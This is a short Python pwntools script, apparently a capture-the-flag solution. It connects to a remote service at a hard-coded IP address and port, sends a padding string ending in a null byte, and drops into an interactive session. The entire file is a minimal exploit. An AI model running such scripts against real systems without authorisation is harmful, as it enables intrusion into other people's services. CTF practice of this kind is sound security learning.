from pwn import *
p = remote("103.229.41.18", 5558)

padding = "AABBCCDD" + "\x00"
p.sendline(padding)

p.interactive()

